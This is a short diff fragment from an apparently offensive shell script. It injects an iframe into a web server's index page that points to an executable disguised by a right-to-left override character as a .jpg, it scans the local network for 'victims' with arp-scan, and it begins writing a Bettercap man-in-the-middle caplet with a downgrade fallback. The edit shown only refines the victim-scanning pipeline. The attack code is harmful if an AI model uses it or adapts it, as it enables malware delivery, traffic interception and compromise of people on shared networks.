@@ -237,7 +237,12 @@ INJECT_HTML="<iframe id='frame' src='google-update-%E2%80%AEexe.jpg' application
 sed -i "s|</body>|${INJECT_HTML}\n</body>|g" /var/www/html/index.html
 
 # --- Scan Network for Victims ---
-TARGETS=$(arp-scan --interface="$IFACE" --localnet --ignoredups --plain | awk '{print $1}' | grep -v "$LAN" | paste -sd ',' -)
+TARGETS=$(arp-scan --interface="$IFACE" --localnet --ignoredups --plain | \
+    awk '{print $1}' | \
+    grep -Eo '([0-9]{1,3}\.){3}[0-9]{1,3}' | \
+    grep -v "$LAN" | \
+    sort -u | \
+    paste -sd ',' -)
 
 # --- Create Bettercap Caplet for MITM with Downgrade Fallback ---
 cat > "/tmp/mitm_fallback.cap" << EOF
